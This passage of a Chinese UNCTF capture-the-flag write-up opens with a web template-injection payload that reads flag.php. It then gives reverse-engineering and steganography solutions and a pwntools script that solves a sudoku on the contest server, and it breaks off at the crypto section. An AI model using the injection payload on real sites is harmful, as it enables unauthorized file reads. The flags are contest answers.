最终payload：
    searchnum={end if}&content={if{haha:type}&type=:read{haha:typename}&typename=file(%27flag.php%27)}
flag：UNCTF{5ee25610af306b625b4cadb4cb5fa24b}
## RE
###  666
逆向签到题，
主要函数
然后找到一些关键值，再根据加密逻辑写解密脚本即可
    exp：
    cipher='''izwhroz""w"v.K".Ni'''
    key=0x12
    flag=''
    for i in range(0,len(cipher),3):
        flag+=chr((ord(cipher[i])^key)-6)
        flag+=chr((ord(cipher[i+1])^key)+6)
        flag+=chr((ord(cipher[i+2])^key)^6)
    print flag
得到flag：unctf{b666b666b}
###  神奇的数组
打开主函数，读一下程序逻辑，结合大小端存储顺序。好的，flag就是checkbox里照抄。
flag：ad461e203c7975b35e527960cbfeb06c
###  BabyXor
手动脱壳+动调，直接出flag23333
flag：flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}
###  unctfeasyMaze
解法一：ida反汇编后程序逻辑就是对地图进行了两次初始化，然后就是正常走迷宫了
将断点设置在地图第二次初始化完成后，然后查看RSI的值
7个一行排列
走完即可得到flag
flag：UNCTF{ssddwdwdddssaasasaaassddddwdds}
解法二：爆破
运行了程序后发现可以一步一步走，一旦走错就会报错
于是可以按位爆破，最多也就是试4*29次，很快的。。。（至少比misc那个走迷宫要快）
## MISC
###  信号不好我先走了
下载得到图片，看了十六进制没有隐藏东西，于是用神器Stegsolve试一波LSB
果然有东西，藏了一个zip包。
保存下来解压缩得到一个张跟之前一样的图片。
盲猜盲水印，工具一把梭，得到
flag：unctf{9d0649505b702643}
###  亲爱的
原以为是mp3隐写，然而没有密码。
看十六进制数据发现有一个zip包在底下，
然后注释有提示
根据提示，和歌名，在qq音乐 海阔天空 李现 的评论区，在对应评论时间找到密码：真的上头
解压得到一张图片，看十六进制数据，底下隐写了一个word文档，
word打开，发现右下角有端倪，是图片一角，拖出来得到flag
（或者直接把word文档当zip打开，在word文件夹中的media文件夹中也有flag 的图片）
flag：UNCTF{W3L0v3Unctf}
###  快乐游戏题
终于出现了签到题，玩游戏得flag
flag：UNCTF{c783910550de39816d1de0f103b0ae32}
###  Happy Puzzle
手撕PNG呗，提示里的RGB没管，400*400比较有用，
最基本的PNG组成：文件头，IHDR，IDAT（len(data)+’IDAT’+data+crc），IEND，和随处可见的crc32校验（这玩意儿坑惨我了）
用windows比较方便的是，crc不用算，用0占位即可，IEND也可以不用加
解题过程：
  4. 随便找个PNG，拿到png文件头+IHDR的数据
  5. 改宽高
  6. 给所有data文件，前面接上len(data)，即00002800，IDAT，再给末尾加上00000000占crc32的位
  7. 做出26张图，看哪张图有图像，然后以此类推的再往后加data
  * 结果：
贴上半自动exp：
    import os
    head='89504e470d0a1a0a0000000d494844520000019000000190080200000000000000'
    idata='0000280049444154'
    crc="1bad748e"
    with open(filename,"rb") as f:
           data = f.read().encode("hex")
    rootdir = ''
    list = os.listdir(rootdir) 
    for i in range(0,len(list)):
           path = os.path.join(rootdir,list[i])
           if os.path.isfile(path) and path[-5:]=='.data':
                  with open(path,"rb") as f:
                         txt = f.read()
                         txt=data+idata+txt.encode("hex")+crc
                  with open(path.replace("puzzle","puzzle2").replace("data","png"),"wb") as f:
                         f.write(txt.decode('hex'))
flag：ucntf{312bbd92c1b291e1827ba519326b6688}
###  think
用python的匿名函数一句话制作出的题目
关键在这里，check函数判断checknum，如果checknum为1，就打印(__print(‘Congratulation!’),
(__print(decrypt(key, encrypted)),猜测后面半部分就是flag
于是，直接运行代码，然后在IDLE里键入check(1)，得到flag
flag:flag{34a94868a8ad9ff82baadb326c513d40}
###  Hidden secret
下载拿到三个里面全是十六进制的文件
看到03 04 05 06 01 02
就意识到这三个是被去掉了50 4B的zip包的三段数据
用010editor拼接起来后得到一个压缩包，里面是一个图片
用010editor打开图片后底下藏了一个zip包
解压得到一串密文：”K<jslc7b5’gBA&]_5MF!h5+E.@IQ&A%EExEzp\X#9YhiSHV#”
base全家桶走一遍，最后确定是base92
得到flag：unctf{cca1a567c3145b1801a4f3273342c622}
###  EasyBox
nc连上后是个数独题，不过是非常规的，只需要行和列不重复即可
魔改了个大佬的脚本：https://blog.csdn.net/zonnin/article/details/78813698
    import itertools
    from pwn import *
    context.log_level='debug'
    sh = remote('101.71.29.5',10011)
    content = sh.recvuntil("answer :\n")[339:718].replace("\n","").split("+-+-+-+-+-+-+-+-+-+")
    sudoku=[]
    for i in content:
        if i!="":
            sudoku.append(i.replace(" ","0")[1:-1].split("|"))
    #print sudoku
    def find_index(s):
        flag=list()
        for i in range(9):
            row=[]
            for j in range(9):
                if s[i][j]=='0':
                    row.append(1)
                else:
                    row.append(0)
            flag.append(row)
        return flag
    def not_done(s):
        return True in [0 in r for r in s]
    def get_row(s, r):
        return s[r]
    def get_column(s, c):
        return [r[c] for r in s]
    def get_possible(s, r, c):
        return [i for i in range(1, 10) \
                    if i not in get_row(s, r) \
                    and i not in get_column(s, c)]
    def go_around(s):
        ans = []
        for index_r, r in enumerate(s): #row_index and row
            row = []
            for index_c, c in enumerate(r): #each in row
                c=int(c)
                if 0 == c:
                    maybe_ans = get_possible(s, index_r, index_c)
                    row.append(maybe_ans[0] if len(maybe_ans) == 1 else 0)
                else:
                    row.append(c)
            ans.append(row)
        return ans
    def print_sudoku(s, msg):
        print msg
        for r in s:
            print " ".join([str(c) for c in r])
        print "*"*18
    #print_sudoku(sudoku, "initializing...")
    FLAG=find_index(sudoku)
    counter=0
    sudoku = go_around(sudoku)
    #print_sudoku(sudoku, "Round "+ str(counter) + " :")
    #counter += 1
    while not_done(sudoku):
        sudoku = go_around(sudoku)
        #print_sudoku(sudoku, "Round "+ str(counter) + " :")
       # counter += 1
    answer=""
    for i in range(9):
        if FLAG[0][i] == 1:
            answer+=str(sudoku[0][i])+","
    answer=answer[:-1]
    sh.sendline(answer)
    #print answer
    for i in range(1,9):
        answer=""
        sh.recvuntil("answer :")
        for j in range(9):
            if FLAG[i][j]==1:
               answer+=str(sudoku[i][j])+","
        answer=answer[:-1]
        sh.sendline(answer)
        #print answer
    sh.interactive()
得到flag：flag{b613e841e0822e2925376d5373cbfbc4}
## CRYPTO
###  不仅仅是RSA
下载附件得到五个文件，